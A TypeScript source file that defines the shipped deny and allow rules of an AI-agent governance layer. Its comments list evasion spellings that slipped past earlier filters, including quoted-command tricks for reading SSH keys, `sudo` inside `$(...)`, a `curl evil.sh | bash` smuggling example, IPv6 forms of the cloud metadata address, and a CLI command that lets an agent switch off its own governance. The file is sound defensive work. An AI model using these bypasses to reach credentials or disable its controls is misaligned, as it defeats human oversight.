// The rules an installation ships with.
//
// Three tiers, following the supervisor's design (see docs-notes/BASELINE-RULES.md
// for the full rationale and the rule-by-rule justification):
//
//   core      immutable denials, enforced at all times, not editable at runtime
//   baseline  shipped allowances that make an agent usable on first boot
//   admin     everything an operator adds afterwards, from observed behaviour
//
// **Why this replaces monitor-as-the-default.** A fresh installation used to
// start in observe-only, because `enforce` with an empty allowlist refuses every
// action and an unusable control gets switched off wholesale. The cost was that
// the shipped default did not restrict anything, which is a poor match for a
// system whose stated posture is default-deny. Shipping a starting policy solves
// the same problem the other way round: the agent works immediately *and* is
// restricted immediately.
//
// **The security argument for commands is the allowlist, not the denylist.**
// Worth being explicit, because it is easy to read the core denials as the
// protection. They are not. A shell can reach a forbidden file through
// indirection no pattern will catch, `c""at $HOME/.ssh/id_rsa`, a variable, a
// script, base64. Enumerating bad commands is a losing game. What actually
// confines the agent is that the baseline *allows* a short list of anchored,
// argument-constrained commands and denies everything else by default. The core
// denials are defence in depth against a careless later rule, not a boundary
// that stands on its own.
import { governanceHomeDir } from "./paths.js";
import type { PolicyRule } from "./policy-types.js";

/** A shipped rule, before ids and timestamps are attached. */
export type SeedRule = Omit<PolicyRule, "id" | "createdAt">;

/**
 * Matches a path that resolved to somewhere **outside** the workspace.
 *
 * Leans on the canonical form established in path-normalize.ts: a path inside
 * the workspace is rendered workspace-relative, and anything else is rendered
 * absolute. So "outside the project" is exactly "starts with `/`, or with a
 * Windows drive letter": no traversal check, no denylist of parent
 * directories. The property falls out of the representation.
 */
const OUTSIDE_WORKSPACE = "^([A-Za-z]:/|/)";

/**
 * Expands a literal into a pattern that matches it in any capitalisation.
 *
 * **Why this is needed (QA round 13, finding 85).** The shipped path denials
 * were case-sensitive and the filesystems they protect are not. Reading an
 * *existing* `.env` spelled `.ENV` was already denied, `path-normalize.ts`
 * resolves the real on-disk name before matching, which was verified rather
 * than assumed, but a path that does not exist yet cannot be resolved, so
 * `canonicalize` falls back to the parent plus the basename **as the agent
 * typed it**. A `write` to `ID_RSA`, `NEW.ENV` or `server.PEM` therefore
 * matched no core rule, and the file it created then kept that casing for every
 * later read.
 *
 * Done in the pattern rather than by case-folding the canonical path, because
 * folding would change the form every operator rule is written against,
 * `^src/App\.ts$` would stop matching, to fix a problem that only exists for
 * this handful of shipped filenames. The rule language has no flags field, so
 * the alternation is spelled out; `anyCase` keeps the source readable and the
 * expansion mechanical.
 */
function anyCase(literal: string): string {
  return Array.from(literal)
    .map((char) => {
      const lower = char.toLowerCase();
      const upper = char.toUpperCase();
      return lower === upper ? char : `[${lower}${upper}]`;
    })
    .join("");
}

/**
 * Credential material, wherever it appears.
 *
 * Deliberately matched by filename rather than by location: a private key
 * copied into the project directory is still a private key, and a rule keyed to
 * `~/.ssh` alone would wave it through. Matched in any capitalisation. See
 * `anyCase`.
 */
const CREDENTIAL_FILES =
  // `.*\.env` rather than `\.env`, so `prod.env` and `staging.env` are covered
  // as well as the dotfile. **This is an extension beyond QA round 13's finding
  // 85, not part of it**, `new.env` was denied in no capitalisation, so it was
  // never a case-sensitivity gap. It is fixed here because the asymmetry it
  // exposed is real: `.pem`, `.pfx`, `.p12` and `.keystore` were already
  // matched with a `.*` prefix and `.env` was not, for no reason anyone
  // recorded, and a file called `staging.env` holds exactly what `.env` holds.
  `(^|/)(.*\\.${anyCase("env")}(\\.[A-Za-z0-9_-]+)?|\\.${anyCase("npmrc")}|` +
  `\\.${anyCase("git-credentials")}|\\.${anyCase("netrc")}|` +
  `${anyCase("id_rsa")}|${anyCase("id_dsa")}|${anyCase("id_ecdsa")}|${anyCase("id_ed25519")}|` +
  `.*\\.${anyCase("pem")}|.*\\.${anyCase("pfx")}|.*\\.${anyCase("p12")}|` +
  `.*\\.${anyCase("keystore")})$`;

/** Directories whose entire contents are credential material. */
const CREDENTIAL_DIRS =
  `(^|/)(\\.${anyCase("ssh")}|\\.${anyCase("aws")}|\\.${anyCase("gnupg")}|` +
  `\\.${anyCase("docker")}|\\.${anyCase("kube")})/`;

/**
 * A command name, however it was reached.
 *
 * **The defect this closes (QA round 13, finding 74.)** The separator class was
 * `(^|[;&|]\s*)`, which required one of exactly three metacharacters
 * *immediately before* the optional whitespace. Measured against the running
 * gate, all of these reached the shell:
 *
 *   `` echo `sudo -i` ``   a backtick is not in the class
 *   `echo $(sudo -i)`      nor is `(`
 *   `FOO=1 sudo -i`        an environment prefix is neither start nor separator
 *   `␣␣sudo -i`            plain leading whitespace: the class wants the
 *                          metacharacter *before* the `\s*`, so both branches fail
 *   `/usr/bin/sudo -i`     the pattern named the bare command, not a path to it
 *   `ls⏎sudo -i`           no `m` flag, so `^` matches only at string start
 *
 * Replaced by "preceded by the start of the string or by any character that
 * cannot be part of a command name, optionally with a path prefix". That covers
 * every spelling above by construction rather than by enumerating disguises,
 * which is the same move `path-normalize.ts` and `canonicalHostname` already
 * make for their resources.
 *
 * It blocks more than strictly intended, `echo "not sudo"` matches, and that
 * is the documented trade in this file's header: blocking more than intended is
 * safer than blocking less. The header's larger point stands unchanged: the
 * denylist is a backstop, and the anchored allowlist is what actually confines
 * the agent.
 */
function commandNamed(...names: readonly string[]): string {
  return `(?:^|[^A-Za-z0-9_.-])(?:[A-Za-z0-9_.:\\\\/-]*[\\\\/])?(?:${names.join("|")})\\b`;
}

/**
 * The governance layer's own state.
 *
 * The policy, the accounts, the audit ledger, its signing key and its
 * checkpoint. An agent able to write here could grant itself permissions or
 * erase the record of having done so, which would make every other guarantee
 * in this system conditional on the agent choosing not to.
 */
const GOVERNANCE_STATE = "(^|/)\\.openclaw/governance(/|$)";

/**
 * Rules that are always in force and cannot be changed at runtime.
 *
 * Two properties distinguish these from every other rule:
 *
 *   1. **Deny wins.** They are consulted before allow rules and cannot be
 *      overridden by one, so a later broad grant cannot re-open them.
 *   2. **They bind under `monitor` too.** Monitor suspends policy *opinions*;
 *      these are the restrictions the installation is unwilling to merely have
 *      an opinion about. Without this, enabling monitor on an agent would be a
 *      one-click way to lift every protection here.
 *
 * Reasserted from this file on every load, so editing `policy.json` by hand
 * cannot remove them.
 */
export const CORE_RULES: readonly SeedRule[] = Object.freeze([
  {
    resourceKind: "path",
    effect: "deny",
    tier: "core",
    pattern: CREDENTIAL_FILES,
    description: "Credential files (.env, private keys, .npmrc, .netrc). Read or write",
  },
  {
    resourceKind: "path",
    effect: "deny",
    tier: "core",
    pattern: CREDENTIAL_DIRS,
    description: "Credential directories (.ssh, .aws, .gnupg, .docker, .kube)",
  },
  {
    resourceKind: "path",
    effect: "deny",
    tier: "core",
    pattern: GOVERNANCE_STATE,
    // Self-protecting: reaching this directory is reaching the policy, the
    // accounts, the ledger and the signing key. Root cannot disable it (T24).
    selfProtecting: true,
    description: "The governance layer's own policy, accounts, audit ledger and signing key",
  },
  {
    resourceKind: "command",
    effect: "deny",
    tier: "core",
    // Backstop only. See the file header. The real protection against these is
    // that the baseline allowlist does not permit a shell in the first place.
    pattern: commandNamed("sudo", "su", "doas", "runas", "pkexec"),
    description: "Privilege escalation (sudo, su, doas, runas, pkexec)",
  },
  {
    resourceKind: "command",
    effect: "deny",
    tier: "core",
    // Both separators. The pattern spelled the path with `/` only, so the
    // plain Windows spelling, `type %USERPROFILE%\.openclaw\governance\
    // policy.json`, was not matched, on the platform this project is
    // developed on (QA round 13, finding 74).
    pattern: "\\.openclaw[\\\\/]+governance",
    selfProtecting: true,
    description: "Any command naming the governance state directory",
  },
  {
    resourceKind: "command",
    effect: "deny",
    tier: "core",
    // ---------------------------------------------------------------------
    // The governance command line itself (QA round 13, finding 73).
    //
    // `openclaw governance policy set-mode off` disables the entire gate, needs
    // no login, and was covered by nothing: the rule above protects the
    // governance *directory*, and this is a *command*. So any operator rule
    // broad enough to let the agent run the project, `^(node|npm|npx|pnpm)
    // .*$` is the first rule most people write, let the agent switch off its
    // own governance. Four spellings were measured against the gate and all
    // four were allowed.
    //
    // This had been recorded as A6, an *attribution* limitation. The
    // authorization half was never written down, and it is the larger one: the
    // design reasoned about the agent's access to resources and not about its
    // access to the control plane governing it.
    //
    // Matched on the subcommand pair rather than on the binary name, because
    // the binary has many spellings (`openclaw`, `node openclaw.mjs`, `npx
    // openclaw`, a global shim) and the subcommand has one. A denial is still a
    // backstop: the real fix is a login on the CLI, which closes A6 at the same
    // time and is tracked as future work.
    // ---------------------------------------------------------------------
    pattern:
      "(?:^|[^A-Za-z0-9_.-])governance\\s+(?:policy|agent|kill|ledger|sessions|pending|users)\\b",
    selfProtecting: true,
    description: "The governance command line, which can switch the gate off",
  },
  {
    resourceKind: "command",
    effect: "deny",
    tier: "core",
    pattern: commandNamed("shutdown", "reboot", "halt", "poweroff", "mkfs", "fdisk"),
    description: "Host destruction and shutdown",
  },
  {
    resourceKind: "network",
    effect: "deny",
    tier: "core",
    // The cloud instance metadata service. Reaching it from a compromised
    // workload is the standard route to stealing a machine's cloud
    // credentials, and no legitimate agent task needs it.
    // ---------------------------------------------------------------------
    // Widened in QA round 13 (finding 75).
    //
    // Round eleven canonicalised four *IPv4* spellings of `169.254.169.254`,
    // trailing dot, single integer, dotted-hex, dotted-octal, and the IPv6
    // family was never considered. `canonicalIpv4` returns `undefined` for
    // anything containing a colon, so these passed through as written and the
    // anchored pattern did not match:
    //
    //   [::ffff:169.254.169.254]   IPv4-mapped IPv6, dotted tail
    //   [::ffff:a9fe:a9fe]         the same address, hex tail
    //   [fd00:ec2::254]            AWS IMDS over IPv6
    //
    // Two other providers were simply absent: `100.100.100.200` (Alibaba) and
    // the bare `metadata` alias that resolves inside Google Cloud.
    //
    // The dotted IPv4-mapped form is now folded to dotted-decimal by
    // `canonicalHostname`, so it is covered by the first alternative rather
    // than by a spelling of its own. The same "fix the representation, not the
    // pattern" move the rest of this layer makes. The hex forms cannot be
    // folded without an IPv6 parser, so they are named.
    // ---------------------------------------------------------------------
    pattern:
      "^(169\\.254\\.169\\.254|100\\.100\\.100\\.200|" +
      "(::ffff:)?a9fe:a9fe|fd00:ec2(::254)?|" +
      "metadata|metadata\\.google\\.internal)$",
    description: "Cloud instance metadata endpoints (credential theft route)",
  },
]);

/**
 * Rules shipped so an agent can do ordinary work on first boot.
 *
 * Unlike core rules these are a **starting point**: an Administrator may remove
 * or narrow any of them. They are the answer to "what does an agent need in
 * order to be useful before anybody has written a policy?", and the answer is
 * kept deliberately small: read the project, look around the filesystem inside
 * it, and run a handful of read-only inspection commands.
 *
 * Every command pattern is fully anchored and excludes shell metacharacters, so
 * a permitted command cannot become a carrier for an arbitrary one. `^ls$` is
 * safe; `ls` would allow `curl evil.sh | bash; ls`.
 */
export const BASELINE_RULES: readonly SeedRule[] = Object.freeze([
  {
    resourceKind: "path",
    effect: "allow",
    tier: "baseline",
    // **Read only.** The brief describes a baseline that permits "reading
    // permitted project files", and until the access dimension existed this
    // rule granted writes as well. Quietly more permissive than the design it
    // was implementing.
    //
    // Modifying the project is a deliberate grant an operator makes, not
    // something an agent should inherit from a default. Without one, a write
    // inside the workspace escalates to a human (or is refused outright under a
    // strict `ask`), which is the correct treatment for an action that changes
    // state on first contact.
    access: "read",
    // Anything the canonical form rendered workspace-relative. I.e. inside the
    // project. Core denials still apply on top, so a `.env` in the project is
    // matched here and refused there.
    pattern: `^(?!${OUTSIDE_WORKSPACE.slice(1)}).+$`,
    description: "Reading files inside the workspace (core denials still apply)",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    pattern: "^(ls|pwd|whoami|date|uname)$",
    description: "Bare inspection commands with no arguments",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    // Arguments limited to a safe character set: no shell metacharacters, so
    // the argument cannot smuggle a second command.
    pattern: "^ls( -[a-zA-Z]{1,8})?( [A-Za-z0-9._/-]{1,200})?$",
    description: "Directory listing with simple flags and one plain path",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    // Split into "no flag" and "one flag" rather than allowing a repeated
    // optional group: `( --[a-z-]{1,20}){0,3}` nests a quantifier inside a
    // quantified group, which this project's own regex-safety check rejects as
    // a backtracking risk. The shipped rules are held to the same standard as
    // an operator's, which is the point. A validator the defaults would fail
    // is a validator nobody believes.
    pattern: "^git (status|branch|diff|log)$",
    description: "Read-only git inspection",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    pattern: "^git (status|branch|diff|log) --[a-z-]{1,20}$",
    description: "Read-only git inspection with a single flag",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    pattern: "^(node|npm|pnpm|python|python3|git) --version$",
    description: "Tool version checks",
  },
]);

/** Escapes a literal for embedding inside a larger pattern. */
function escapeLiteral(value: string): string {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Core denials protecting the governance directory **actually in use**.
 *
 * **The defect this closes (QA round 13, finding 86.)** `GOVERNANCE_STATE` and
 * the matching command denial both spell the literal `.openclaw/governance`.
 * `paths.ts` documents `OPENCLAW_GOVERNANCE_DIR` as a supported deployment
 * feature, "so a deployment can place the ledger on separate storage… without
 * a code change", and taking that option silently removed the agent's
 * inability to read the policy, the accounts, the audit ledger and its signing
 * key. The protection was written against a path constant rather than against
 * the directory the installation is really using, so the documented deployment
 * step and the core tier disagreed, and the deployment step won.
 *
 * Derived on every load, because `reassertCoreRules` rebuilds the core tier on
 * every load and `governanceHomeDir()` reads the environment each time. So
 * relocating the directory moves the protection with it, and no stored rule can
 * be stale.
 *
 * The static patterns are kept as well as these, not replaced by them: an
 * installation reached through a symbolic link, or one that later moves back,
 * is still covered, and a denial that is broader than necessary costs nothing
 * an agent legitimately needs.
 */
export function governanceStateRules(): readonly SeedRule[] {
  // The canonical form path rules are matched against: forward slashes, and
  // absolute whenever the target is outside the workspace, which the
  // governance directory always is.
  const home = governanceHomeDir().replaceAll("\\", "/").replace(/\/+$/, "");
  if (!home) {
    return [];
  }
  return Object.freeze([
    {
      resourceKind: "path",
      effect: "deny",
      tier: "core",
      pattern: `^${escapeLiteral(home)}(/|$)`,
      selfProtecting: true,
      description: "The governance directory in use (policy, accounts, ledger, signing key)",
    },
    {
      resourceKind: "command",
      effect: "deny",
      tier: "core",
      // Either separator, because a command names the directory as the shell
      // spells it rather than in the canonical form paths are reduced to.
      pattern: escapeLiteral(home).replaceAll("/", "[\\\\/]+"),
      selfProtecting: true,
      description: "Any command naming the governance directory in use",
    },
  ]);
}

/**
 * Every core rule in force, static and derived.
 *
 * `CORE_RULES` remains the declared, reviewable set; this is what the store
 * actually asserts, so a relocated governance directory is protected too.
 */
export function coreRules(): readonly SeedRule[] {
  return [...CORE_RULES, ...governanceStateRules()];
}

/** Every shipped rule, core first. */
export function seedRules(): readonly SeedRule[] {
  return [...coreRules(), ...BASELINE_RULES];
}

/**
 * True for a rule the installation shipped with, rather than one an operator
 * wrote.
 *
 * Exported because the distinction matters in three places: the dashboard shows
 * shipped rules differently, the CLI marks them, and tests asserting "the
 * policy contains exactly the rules I added" need to exclude them without
 * hard-coding how many there are.
 */
export function isShippedRule(rule: { tier?: string; createdBy?: string }): boolean {
  return rule.tier === "core" || rule.tier === "baseline" || rule.createdBy === "system";
}

/** Stable id for a shipped rule, so re-seeding never duplicates it. */
export function seedRuleId(rule: SeedRule): string {
  const slug = rule.description
    ?.toLowerCase()
    .replaceAll(/[^a-z0-9]+/g, "-")
    .replaceAll(/^-|-$/g, "")
    .slice(0, 48);
  return `${rule.tier}-${rule.resourceKind}-${slug || "rule"}`;
}
